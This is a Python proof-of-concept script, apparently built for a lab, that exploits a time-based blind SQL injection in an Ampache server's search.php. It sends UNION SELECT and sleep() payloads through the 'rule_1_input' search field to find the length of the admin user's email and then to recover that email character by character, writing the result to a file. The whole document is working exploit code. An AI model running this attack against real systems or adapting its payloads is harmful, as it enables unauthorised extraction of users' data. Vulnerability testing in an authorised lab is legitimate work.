import requests
import time
import math

print("Executing Injection.py")
host = 'web'
origin_url = 'http://' + host
search_url = origin_url + '/search.php'
referer_url = origin_url + '/index.php'

headers = {
    'Host': host,
    'Content-Length': '87',
    'Accept': '*/*',
    'DNT': '1',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': origin_url,
    'Referer': referer_url,
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Connection': 'close',
}

params = (
    ('type', 'song'),
)

delay = 1  # sleep(delay) in SQL

print("Sending requests")

pass_len_min = 16
pass_len_max = 255
for i in range(pass_len_min, pass_len_max):
    data = 'limit=0&operator=or&rule_1=last_play&rule_1_operator=1&rule_1_input=1)) union select 1 from ampachedb.user where id=1 and length(email)={0} and sleep({1})--&action=search'.format(i, delay)

    start_time = int(round(time.time() * 1000))
    response = requests.post(search_url, headers=headers, params=params,  data=data, verify=False)
    time_diff = int(round(time.time() * 1000)) - start_time - delay * 1000
    if time_diff > 0:
        pass_len = i
        break

email = ''
for i in range(1, 17):
    min = 1
    max = 90

    while abs(max - min) > 1:
        mid = math.floor((max + min) / 2)
        data = 'limit=0&operator=or&rule_1=last_play&rule_1_operator=1&rule_1_input=1)) union select 1 from user where id=1 and ascii(substr(upper(email),{2},1))>={0} and sleep({1})--&action=search'.format(mid, delay, i)

        start_time = int(round(time.time() * 1000))
        response = requests.post(search_url, headers=headers, params=params, data=data, verify=False)
        time_diff = int(round(time.time() * 1000)) - start_time - delay * 1000

        if time_diff > 0:
            min = mid
        else:
            max = mid

    print("gussed chr of position {} is: {}".format(i, chr(max-1)))
    email += chr(max-1)

result2txt = str(email)
result2txt = result2txt.lower()
print('the admin\'s email is ' + result2txt)
with open('email.txt', 'a') as file_handle:
    file_handle.write(result2txt)
    file_handle.write('\n')

if result2txt == "123456@gmail.com" :
    print("PoC success!")
